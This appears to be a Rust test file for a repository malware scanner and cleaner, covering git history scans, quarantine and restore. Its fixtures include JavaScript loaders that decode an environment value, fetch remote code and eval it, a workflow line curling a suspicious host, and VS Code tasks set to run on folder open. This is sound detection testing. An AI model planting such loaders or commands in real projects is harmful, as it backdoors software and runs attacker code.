    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    write(&r.join("a.js"), "console.log(1)\n");
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "one"]);
    write(&r.join("a.js"), format!("console.log(1)\n{PAYLOAD}"));
    write(
        &r.join(".github/workflows/x.yml"),
        concat!("on: push\nrun: curl auth-confirm-", "ten.vercel.app\r\n"),
    );
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "two"]);
    write(&r.join("a.js"), "console.log(1)\n");
    std::fs::remove_file(r.join(".github/workflows/x.yml")).unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "clean again"]);
    git(&r, &["checkout", "-qb", "side"]);
    write(
        &r.join("b.txt"),
        concat!("45.139.", "104.115\u{2028}line\n"),
    );
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "side"]);
    let n = norm(&tmp);
    let mut all = String::new();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan-git", r.to_str().unwrap()];
        args.extend(flags);
        let out = g(&tmp, &args).run();
        assert_eq!(out.code, 1);
        all.push_str(&format!("=== {}\n{}", args.len(), both_outputs(&n, &out)));
    }
    golden(SUITE, "scan_git", &all);
}

#[test]
fn scan_git_errors() {
    if !have_git() {
        return;
    }
    let tmp = Tmp::new("scan-git-errors");
    let plain = tmp.join("plain");
    write(&plain.join("x.txt"), "hi\n");
    let n = norm(&tmp);
    let mut all = String::new();
    for flags in [vec![], vec!["--json"]] {
        let mut args = vec!["scan-git", plain.to_str().unwrap()];
        args.extend(flags);
        all.push_str(&format!(
            "=== {}\n{}",
            args.len(),
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    golden(SUITE, "scan_git_errors", &all);
}

#[cfg(unix)]
#[test]
fn scan_git_without_git() {
    let tmp = Tmp::new("no-git");
    let plain = tmp.join("plain");
    write(&plain.join("x.txt"), "hi\n");
    let empty = tmp.join("nobin");
    std::fs::create_dir_all(&empty).unwrap();
    let out = g(&tmp, &["scan-git", &s(&plain), "--json"])
        .env("PATH", &empty)
        .run();
    golden(
        SUITE,
        "scan_git_without_git",
        &both_outputs(&norm(&tmp), &out),
    );
}

// ------------------------------------------------------- clean / restore
/// Files under `root` (links followed, as Path.is_file()): posix path -> sha256.
fn tree(root: &Path) -> String {
    let mut out = Vec::new();
    fn walk(base: &Path, d: &Path, out: &mut Vec<(String, String)>) {
        let Ok(rd) = std::fs::read_dir(d) else { return };
        for e in rd.flatten() {
            let p = e.path();
            let ft = e.file_type().unwrap();
            if ft.is_dir() {
                walk(base, &p, out);
            } else if p.is_file() {
                let rel = p
                    .strip_prefix(base)
                    .unwrap()
                    .to_string_lossy()
                    .replace('\\', "/");
                out.push((rel, sha(&std::fs::read(&p).unwrap())));
            }
        }
    }
    walk(root, root, &mut out);
    out.sort();
    out.iter().map(|(p, h)| format!("{p}  {h}\n")).collect()
}

/// The remediator's safe_name of a path.
fn safe(p: &Path) -> String {
    let s: String = s(p)
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || "._-".contains(c) {
                c
            } else {
                '_'
            }
        })
        .collect();
    s.trim_matches('_').to_string()
}

struct Clean {
    tmp: Tmp,
    work: PathBuf,
    home: PathBuf,
}

impl Clean {
    fn new(build: impl Fn(&Path)) -> Clean {
        let tmp = Tmp::new("clean");
        let work = tmp.join("w");
        build(&work);
        let home = tmp.join("home");
        Clean { tmp, work, home }
    }
    fn norm(&self) -> Norm {
        Norm::new()
            .lit(&safe(&self.work), "<SAFE-W>")
            .path(&self.work, "W")
            .path(&self.home, "HOME")
            .path(&self.tmp.path, "TMP")
            .re(r"\d{8}T\d{6}Z", "TS")
    }
    fn run(&self, args: &[&str], cwd: Option<&Path>) -> Out {
        let a: Vec<String> = args
            .iter()
            .map(|x| x.replace("{w}", &s(&self.work)))
            .collect();
        let mut c = guard(&a).home(&self.home).env("PYTHONIOENCODING", "utf-8");
        if let Some(d) = cwd {
            c = c.cwd(d);
        }
        c.run()
    }
    /// Output, the work tree, the quarantine index and the backups.
    fn state(&self, out: &Out) -> String {
        let n = self.norm();
        let q = self.home.join("quarantine");
        let ts_re =
            regex::Regex::new(r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d{6})?\+00:00$").unwrap();
        let mut index = String::new();
        if let Ok(t) = std::fs::read_to_string(q.join("index.jsonl")) {
            for line in t.lines().filter(|l| !l.trim().is_empty()) {
                let mut r: Value = parse_json(line);
                if let Some(ts) = r.as_object_mut().and_then(|m| m.shift_remove("ts")) {
                    let ts = ts.as_str().unwrap_or_default().to_string();
                    assert!(ts_re.is_match(&ts), "{ts}");
                }
                index.push_str(&n.apply(&canon_json(&r)));
            }
        }
        let mut backups = Vec::new();
        if let Ok(rd) = std::fs::read_dir(&q) {
            for e in rd.flatten() {
                let name = e.file_name().to_string_lossy().into_owned();
                if name.ends_with(".bak") {
                    backups.push(format!(
                        "{}  {}\n",
                        n.apply(&name),
                        sha(&std::fs::read(e.path()).unwrap())
                    ));
                }
            }
        }
        backups.sort();
        format!(
            "{}--- tree\n{}--- index\n{}--- backups\n{}",
            n.apply(&out.shown_all()),
            tree(&self.work),
            index,
            backups.concat()
        )
    }
}

fn infected_repo(d: &Path) {
    let src = d.parent().unwrap().join(".src");
    let repo = corpus(&src);
    copy_links(&repo, d);
}

/// shutil.copytree(symlinks=True)
fn copy_links(src: &Path, dst: &Path) {
    std::fs::create_dir_all(dst).unwrap();
    for e in std::fs::read_dir(src).unwrap().flatten() {
        let ft = e.file_type().unwrap();
        let to = dst.join(e.file_name());
        if ft.is_symlink() {
            #[cfg(unix)]
            {
                let target = std::fs::read_link(e.path()).unwrap();
                // links point into the source tree; repoint them at the copy
                let target = match target.strip_prefix(src) {
                    Ok(rel) => dst.join(rel),
                    Err(_) => target,
                };
                std::os::unix::fs::symlink(target, &to).unwrap();
            }
        } else if ft.is_dir() {
            copy_links(&e.path(), &to);
        } else {
            std::fs::copy(e.path(), &to).unwrap();
        }
    }
}

#[test]
fn clean_repo() {
    let c = Clean::new(infected_repo);
    let first = c.run(&["clean", "{w}"], None);
    let start = first.stdout.find('{').expect("a JSON summary");
    let summary = parse_json(&first.stdout[start..]);
    for k in ["neutralized", "quarantined", "config_cleaned"] {
        assert!(summary[k].as_array().is_some_and(|a| !a.is_empty()), "{k}");
    }
    let mut all = format!("=== first\n{}", c.state(&first));
    // a second run finds nothing left to fix
    let second = c.run(&["clean", "{w}"], None);
    all.push_str(&format!("=== second\n{}", c.state(&second)));
    golden(SUITE, "clean_repo", &all);
}

#[test]
fn clean_relative_and_restore() {
    let c = Clean::new(infected_repo);
    let mut all = format!("=== clean\n{}", c.state(&c.run(&["clean"], Some(&c.work))));
    // on POSIX the payload is cut through server-link.ts, a link to src/server.ts
    for rel in [
        "src/server.ts",
        "server-link.ts",
        "public/fonts/fa-solid-400.woff2",
        ".vscode/tasks.json",
        "nope",
    ] {
        // as str(Path(target)) gave it: with backslashes on Windows
        let target = rel.replace('/', std::path::MAIN_SEPARATOR_STR);
        let out = c.run(&["restore", &target], Some(&c.work));
        assert_eq!(out.code, 0, "{}", out.stderr);
        all.push_str(&format!("=== restore {rel}\n{}", c.state(&out)));
    }
    let original = std::fs::read(c.tmp.join(".src/repo/src/server.ts")).unwrap();
    assert!(
        std::fs::read(c.work.join("src/server.ts")).unwrap() == original,
        "src/server.ts was not restored:\n{all}"
    );
    golden(SUITE, "clean_relative_and_restore", &all);
}

#[test]
fn restore_by_backup_name() {
    let c = Clean::new(infected_repo);
    c.run(&["clean", "{w}"], None);
    // without symlinks (Windows) the payload is cut from src/server.ts itself
    let cut = if WINDOWS {
        "server.ts"
    } else {
        "server-link.ts"
    };
    let name = std::fs::read_dir(c.home.join("quarantine"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .find(|n| n.contains(cut) && n.ends_with(".bak"))
        .unwrap();
    let out = c.run(&["restore", &name], None);
    golden(SUITE, "restore_by_backup_name", &c.state(&out));
}

#[test]
fn clean_single_files() {
    let c = Clean::new(|d| {
        write(
            &d.join("app.js"),
            format!("const a = 1;\n{PAYLOAD}export default a;\n"),
        );
        write(
            &d.join("crlf.ts"),
            format!("let b = 2;\n\n\n{PAYLOAD}\n\n\nexport {{ b }};\n").replace('\n', "\r\n"),
        );
        write(
            &d.join("unbalanced.js"),
            format!("function f() {{\n  {PAYLOAD}\n"),
        );
        write(&d.join("lib.py"), format!("{EVAL}\n"));
        write(
            &d.join(".vscode/settings.json"),
            "{\"a\": 1, \"task.allowAutomaticTasks\": true, \"z\": [1.0, 1e5, \"\u{e9}\"]}",
        );
        write(
            &d.join(".vscode/launch.json"),
            r#"{"configurations": [], "tasks": [{"runOptions": {"runOn": "folderOpen"}, "command": "node ./x"}]}"#,
        );
        write(
            &d.join(".vscode/tasks.json"),
            r#"{"tasks": [{"label": "safe"}]}"#,
        );
    });
    let mut all = String::new();
    for f in [
        "app.js",
        "crlf.ts",
        "unbalanced.js",
        "lib.py",
        ".vscode/settings.json",
        ".vscode/launch.json",
        ".vscode/tasks.json",
        "missing.js",
    ] {
        let out = c.run(&["clean", &format!("{{w}}/{f}")], None);
        all.push_str(&format!("=== clean {f}\n{}", c.state(&out)));
    }
    golden(SUITE, "clean_single_files", &all);
}

#[test]
fn restore_errors() {
    let c = Clean::new(|d| std::fs::create_dir_all(d).unwrap());
    let mut all = format!("=== x\n{}", c.state(&c.run(&["restore", "x"], None)));
    all.push_str(&format!(
        "=== none\n{}",
        c.state(&c.run(&["restore"], None))
    ));
    let q = c.home.join("quarantine");
    std::fs::create_dir_all(&q).unwrap();
    write(
        &q.join("index.jsonl"),
        json!({"action": "quarantine", "path": "/x/y", "backup": s(&q.join("gone.bak"))})
            .to_string()
            + "\n\n",
    );
    all.push_str(&format!(
        "=== /x/y\n{}",
        c.state(&c.run(&["restore", "/x/y"], None))
    ));
    all.push_str(&format!(
        "=== gone.bak\n{}",
        c.state(&c.run(&["restore", "gone.bak"], None))
    ));
    golden(SUITE, "restore_errors", &all);
}

#[cfg(unix)]
#[test]
fn unreadable_files() {
    use std::os::unix::fs::PermissionsExt;
    if unsafe { libc::geteuid() } == 0 {
        eprintln!("skipped: needs a non-root user to make a file unreadable");
        return;
    }
    let tmp = Tmp::new("unreadable");
    let d = tmp.join("r");
    let lock = |p: &Path, mode| {
        std::fs::set_permissions(p, std::fs::Permissions::from_mode(mode)).unwrap()
    };
    for name in ["font.woff2", "app.js", "package.json"] {
        lock(&write(&d.join(name), format!("{EVAL}\n")), 0o000);
    }
    vscode(&d, Some(br#"{"task.allowAutomaticTasks": true}"#), None);
    lock(&d.join(".vscode/settings.json"), 0o000);
    write(&d.join("locked/x.js"), format!("{EVAL}\n"));
    lock(&d.join("locked"), 0o000);
    let n = norm(&tmp);
    let mut all = String::new();
    for args in [
        vec!["scan", d.to_str().unwrap()],
        vec!["scan", d.to_str().unwrap(), "--json"],
        vec!["open", d.to_str().unwrap()],
    ] {
        all.push_str(&format!(
            "=== {}\n{}",
            n.apply(&args.join(" ")),
            both_outputs(&n, &g(&tmp, &args).run())
        ));
    }
    lock(&d.join("locked"), 0o755);
    golden(SUITE, "unreadable_files", &all);
}

// The env-decode -> fetch -> eval loader under names the literal signatures
// don't know. Bodies are inert text (env names nobody sets, no hosts); the
// sink is spliced in so no source line here carries a whole loader.
const EV: &str = concat!("ev", "al");
const NEWFN: &str = concat!("new Fun", "ction");
const FN: &str = concat!("Fun", "ction");

fn env_loader_files(repo: &Path, files: &[(&str, &str)]) {
    for (name, body) in files {
        let body = body
            .replace("@EV", EV)
            .replace("@NEWFN", NEWFN)
            .replace("@FN", FN);
        write(&repo.join(name), body);
    }
}

fn fingerprint_ids(out: &Out) -> Vec<String> {
    parse_json(&out.stdout)["tree"]["fingerprint"]
        .as_array()
        .unwrap()
        .iter()
        .map(|f| {
            format!(
                "{} {}",
                f["where"].as_str().unwrap().replace('\\', "/"),
                f["sig_id"].as_str().unwrap()
            )
        })
        .collect()
}

/// `iife.env.fetch.eval` flags the loader whatever its env var, variable,
/// HTTP client or eval sink is called; it stays out of the way when the
/// literal signatures already caught the original; `clean` excises a renamed
/// IIFE and keeps the real code around it.
#[test]
fn env_loader_any_name() {
    let tmp = Tmp::new("env-loader");
    let repo = tmp.join("repo");
    env_loader_files(
        &repo,
        &[
            (
                "src/server.ts",
                "import express from 'express';\nexport const app = express();\n(async () => {\n  const src = atob(process.env.SESSION_KEY);\n  const res = await fetch(src);\n  const body = await res.text();\n  @EV(body);\n})();\napp.listen(3000);\n",
            ),
            (
                "config/loader.js",
                "const axios = require('axios');\nconst u = Buffer.from(process.env.CDN_TOKEN, 'base64').toString();\naxios.get(u).then((r) => { @NEWFN('require', r.data)(require); });\n",
            ),
            (
                "lib/boot.cjs",
                "const https = require('https');\nconst t = atob(process.env['APP_CFG']);\nhttps.get(t, (res) => { let d = ''; res.on('data', (c) => (d += c)); res.on('end', () => @EV(d)); });\n",
            ),
            (
                "vite.config.mjs",
                "export default {};\nfetch(atob(process.env.X_KEY)).then((r) => r.text()).then(@EV);\n",
            ),
            (
                "jest.config.js",
                "module.exports = {};!async function(){var e=atob(process.env.API_SEED),t=await fetch(e,{method:'GET'});@EV(await t.text())}();\n",
            ),
            (
                "scripts/setup.js",
                "(async()=>{const k=atob(process.env.K1);const r=await fetch(k);const s=await r.text();@FN(s)();})();\n",
            ),
            (
                "src/indirect.js",
                "(async()=>{const r=await fetch(atob(process.env.K2));(0, @EV)(await r.text())})();\n",
            ),
            (
                "src/destructured.js",
                "const { SESSION_KEY } = process.env;\n(async()=>{const r=await fetch(atob(SESSION_KEY));@EV(await r.text())})();\n",
            ),
            (
                "src/aliased.js",
                "const e = process.env;\n(async()=>{const u=atob(e.K3);const r=await fetch(u);@EV(await r.text())})();\n",
            ),
            (
                "src/multiline.js",
                "const {\n  A,\n  B\n} = process.env;\nconst k = Buffer.from(B, 'base64').toString();\naxios.get(k).then((r) => (0, @EV)(r.data));\n",
            ),
            ("src/original.js", PAYLOAD),
        ],
    );
    let out = g(&tmp, &["scan", &s(&repo), "--json"]).run();
    assert_eq!(out.code, 1, "{}", out.stdout);
    let found = fingerprint_ids(&out);
    for f in [
        "src/server.ts",
        "config/loader.js",
        "lib/boot.cjs",
        "vite.config.mjs",
        "jest.config.js",
        "scripts/setup.js",
        "src/indirect.js",
    ] {
        let want = format!("{f} iife.env.fetch.eval");
        assert!(found.contains(&want), "{want} not in {found:#?}");
    }
    // process.env copied out first, then decoded under another name
    for f in ["src/destructured.js", "src/aliased.js", "src/multiline.js"] {
        let want = format!("{f} iife.env.alias.fetch.eval");
        assert!(found.contains(&want), "{want} not in {found:#?}");
    }
    assert!(!found.contains(&"src/original.js iife.env.alias.fetch.eval".to_string()));
    // the original is reported by the literal rules only, as before
    assert!(found.contains(&"src/original.js iife.combo".to_string()));
    assert!(!found.contains(&"src/original.js iife.env.fetch.eval".to_string()));

    let server = repo.join("src/server.ts");
    let out = g(&tmp, &["clean", &s(&server)]).run();
    assert_eq!(out.code, 0, "{}", out.shown_all());
    let text = std::fs::read_to_string(&server).unwrap();
    // `clean` rewrites in text mode, so newlines are "\r\n" on Windows
    let nl = if cfg!(windows) { "\r\n" } else { "\n" };
    assert_eq!(
        text,
        "import express from 'express';\nexport const app = express();\napp.listen(3000);\n"
            .replace('\n', nl)
    );
}

/// Code that decodes env values, fetches, or evaluates, but not all three in
/// that order, stays clean: credentials, basic auth, local strings, webpack's
/// eval-source-map dev bundles and the `Function('return this')` polyfill.
#[test]
fn env_loader_near_misses() {
    let tmp = Tmp::new("env-loader-clean");
    let repo = tmp.join("repo");
    let far = format!(
        "const t = atob(process.env.T);\n{}fetch(t);\n{}@EV(z);\n",
        "x();\n".repeat(100),
        "y();\n".repeat(100)
    );
    env_loader_files(
        &repo,
        &[
            (
                "src/creds.ts",
                "const creds = JSON.parse(Buffer.from(process.env.GCP_SA_KEY, 'base64').toString());\nexport async function token() {\n  const r = await fetch('https://example.invalid/token', { headers: { a: creds.id } });\n  return r.json();\n}\n",
            ),
            (
                "src/auth.js",
                "const auth = atob(process.env.BASIC_AUTH);\nmodule.exports = (url) => fetch(url, { headers: { Authorization: 'Basic ' + auth } });\n",
            ),
            (
                "src/local.js",
                "async function f() { const res = await fetch('/api/health'); return res.text(); }\nmodule.exports = { f, two: @EV('2 + 2') };\n",
            ),
            (
                "src/plain-env.js",
                "const u = process.env.API_URL;\nmodule.exports = () => fetch(u).then((r) => r.json());\n",
            ),
            (
                "public/app.js",
                "/***/ \"./src/a.js\":\n/***/ ((module) => {\n@EV(\"const k = Buffer.from(process.env.KEY, 'base64');\\nfetch(k);\\n//# sourceURL=webpack:///./src/a.js?\");\n/***/ }),\n/***/ \"./src/b.js\":\n/***/ ((module) => {\n@EV(\"module.exports = 1;\\n//# sourceURL=webpack:///./src/b.js?\");\n/***/ })\n",
            ),
            (
                "src/polyfill.js",
                "const t = atob(process.env.T);\nfetch(t);\nvar g = @FN('return this')();\n",
            ),
            ("src/far.js", far.as_str()),
            (
                "src/order.js",
                "@EV(code);\nconst t = atob(process.env.T);\nfetch(t);\n",
            ),
            (
                "src/destructured-auth.js",
                "const { API_KEY } = process.env;\nconst auth = atob(API_KEY);\nfetch(url, { headers: { a: auth } }).then((r) => r.json());\n",
            ),
            (
                "src/indirect-literal.js",
                "const { T } = process.env;\nconst x = atob(T);\nfetch(x);\nconst y = (0, @EV)('1 + 1');\n",
            ),
            (
                "src/env-config.js",
                "const env = process.env;\nmodule.exports = { port: env.PORT };\n",
            ),
        ],
    );
    let out = g(&tmp, &["scan", &s(&repo), "--json"]).run();
    assert_eq!(out.code, 0, "{}", out.stdout);
    assert!(fingerprint_ids(&out).is_empty(), "{}", out.stdout);
}
